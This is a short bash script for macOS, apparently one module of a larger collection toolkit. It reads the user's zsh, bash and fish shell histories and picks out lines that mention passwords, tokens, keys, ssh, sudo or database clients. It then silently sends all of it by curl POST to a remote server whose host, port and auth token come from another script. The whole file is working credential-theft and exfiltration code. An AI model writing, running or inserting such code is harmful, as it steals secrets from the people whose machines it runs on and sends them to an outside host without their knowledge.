#!/bin/bash
# history_mac.sh - inherits H, P, AU, TH from init_mac.sh

KEYWORDS="password pass secret token key api ssh curl wget credential sudo su mysql postgres"

OUT=""

# ── zsh history (default on macOS Catalina+) ─────────────
ZSH_HIST="$HOME/.zsh_history"
if [ -f "$ZSH_HIST" ]; then
    # zsh history has timestamps in format ": 1234567890:0;command" - strip them
    ZSH_LINES=$(cat "$ZSH_HIST" 2>/dev/null | sed 's/^: [0-9]*:[0-9]*;//' | tail -200)
    OUT="$OUT\n[ZSH HISTORY (~/.zsh_history)]\nlines: $(wc -l < "$ZSH_HIST")\n\n$ZSH_LINES"
else
    OUT="$OUT\n[ZSH HISTORY]\n(not found)"
fi

# ── bash history ──────────────────────────────────────────
BASH_HIST="$HOME/.bash_history"
if [ -f "$BASH_HIST" ]; then
    BASH_LINES=$(tail -100 "$BASH_HIST" 2>/dev/null)
    OUT="$OUT\n\n[BASH HISTORY (~/.bash_history)]\nlines: $(wc -l < "$BASH_HIST")\n\n$BASH_LINES"
else
    OUT="$OUT\n\n[BASH HISTORY]\n(not found)"
fi

# ── fish history ──────────────────────────────────────────
FISH_HIST="$HOME/.local/share/fish/fish_history"
if [ -f "$FISH_HIST" ]; then
    FISH_LINES=$(grep "^- cmd:" "$FISH_HIST" 2>/dev/null | sed 's/^- cmd: //' | tail -50)
    OUT="$OUT\n\n[FISH HISTORY]\n$FISH_LINES"
fi

# ── flagged commands ──────────────────────────────────────
FLAGGED=""
COMBINED=$(cat "$HOME/.zsh_history" "$HOME/.bash_history" 2>/dev/null | sed 's/^: [0-9]*:[0-9]*;//')
while IFS= read -r LINE; do
    LOWER=$(echo "$LINE" | tr '[:upper:]' '[:lower:]')
    for KW in $KEYWORDS; do
        if echo "$LOWER" | grep -q "$KW"; then
            FLAGGED="$FLAGGED\n$LINE"
            break
        fi
    done
done <<< "$COMBINED"

OUT="$OUT\n\n[FLAGGED COMMANDS]\n${FLAGGED:-(none)}"

printf "$OUT" | curl -s -X POST "https://$H:$P/store/history" \
     -H "Authorization: $AU" \
     -H "Content-Type: text/plain" \
     -H "X-Target: $TH" \
     --data-binary @- >/dev/null 2>&1
